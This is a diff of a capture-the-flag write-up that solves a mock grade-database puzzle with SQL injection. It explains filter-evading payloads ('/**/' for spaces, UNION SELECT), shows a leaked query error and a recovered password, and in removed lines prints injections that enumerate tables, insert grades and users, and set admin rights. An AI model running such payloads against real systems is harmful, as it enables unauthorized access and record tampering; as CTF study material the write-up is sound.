@@ -1,13 +1,15 @@
-##Puzzle 4
+## Puzzle 4
 
-First, if we log in normally, we see the table below (with Fs instead of As). There's not much we can take from this, other than perhaps that the instructor name `noam_chomsky` could be important later.
+First, if we log in normally, we see the grade table below (with Fs instead of As). There's not much we can take from this, other than perhaps that the instructor name `noam_chomsky` could be important later. Also, the `Recieve Diploma` button starts disabled, and the JS shows that it unhides an element that doesn't exist. So maybe we need to raise our grades?
 
 ![image](gradebase3.png)
 
-We solved this problem using SQL injection, which almost always start with `'` to mark the end of the current string and end with `--` which tells SQL to ignore the rest of the query. We also use `/**/` instead of just a space, since the query sanitization code is smart enough to get rid of spaces and even `%20`.
+We go about this problem using SQL injection, which almost always start with `'` to mark the end of the current string and end with `--` which tells SQL to ignore the rest of the query. We also use `/**/` instead of just a space, since the query sanitization code is smart enough to get rid of spaces and even `%20`.
 
 Most of our queries use `UNION SELECT` to replace the original query output. Using `UNION SELECT` queries means we first have to determine the number of columns in the main query. Inputting a random query with an error like below
+
 ![image](gradebase1.png)
+
 sends us to an error page that provides more information about the database:
 ```
 (psycopg2.errors.SyntaxError) syntax error at or near "Char" LINE 1: SELECT * FROM "user" WHERE username=''Char(45)--' ^ [SQL: SELECT * FROM "user" WHERE username=''Char(45)--'] (Background on this error at: http://sqlalche.me/e/13/f405)
@@ -37,29 +39,12 @@ So now we know that the user `noam_chomsky` has the password `Wn-gbbWutxT0fyZlsV
 
 ![image](gradebase5.png)
 
-Sure enough, instead of the typical grade home page, we see an admin page. When we scroll to the bottom, we see some of our grades (which were F)
+Sure enough, instead of the typical grade home page, we see an admin page. When we scroll to the bottom, we see some of our grades (which were F), as well as a submit button.
 
 ![image](gradebase6.png)
 
-crap'/**/UNION/**/SELECT/**/0,STRING_AGG(table_name::text,','),null,null,null,null,null/**/FROM/**/information_schema.tables--
+Once we raise our grades and hit submit, we can log back in to our own account. Since we have good grades now, the diploma can be revealed.
 
-user,grade,information_schema_catalog_name,attributes,applicable_roles,administrable_role_authorizations,check_constraint_routine_usage,character_sets,check_constraints,collations,collation_character_set_applicability,column_domain_usage,column_privileges,routine_privileges,column_udt_usage,columns,constraint_column_usage,role_routine_grants,constraint_table_usage,domain_constraints,domain_udt_usage,routines,domains,enabled_roles,key_column_usage,schemata,parameters,referential_constraints,sql_languages,role_column_grants,sequences,sql_features,sql_implementation_info,sql_packages,sql_sizing,sql_sizing_profiles,view_routine_usage,table_constraints,table_privileges,foreign_table_options,role_table_grants,view_table_usage,tables,triggered_update_columns,foreign_data_wrappers,triggers,views,udt_privileges,role_udt_grants,usage_privileges,data_type_privileges,role_usage_grants,user_defined_types,view_column_usage,element_types,column_options,foreign_server_options,foreign_data_wrapper_options,foreign_servers,user_mapping_options,foreign_tables,user_mappings
+![image](gradebase7.png)
 
-
-id,user_id,classname,grade,code,credits
-crap'/**/UNION/**/SELECT/**/0,STRING_AGG(id::text,','),null,null,null,null,null/**/FROM/**/"grade"--
-
-';INSERT/**/INTO/**/grade/**/VALUES/**/(15122,1,'signed_by_Noam_Chomsky',333,'lolHackMIT',69420)--
-
-';INSERT/**/INTO/**/grade/**/VALUES/**/(12345,1,'Coolidge',-1000000,'Calvin',100000)--
-
-
-
-
-id,username,year,gender,favorite_color,password_4d8f182b,admin
-crap'/**/UNION/**/SELECT/**/0,STRING_AGG(admin::text,','),null,null,null,null,null/**/FROM/**/"user"--
-
-
-';INSERT/**/INTO/**/"user"/**/VALUES/**/(2,'coolidge',2020,'F','gold','noam_chomsky',true)--
-
-';UPDATE/**/"user"/**/SET/**/admin=true--
+These 3 words are the solution.
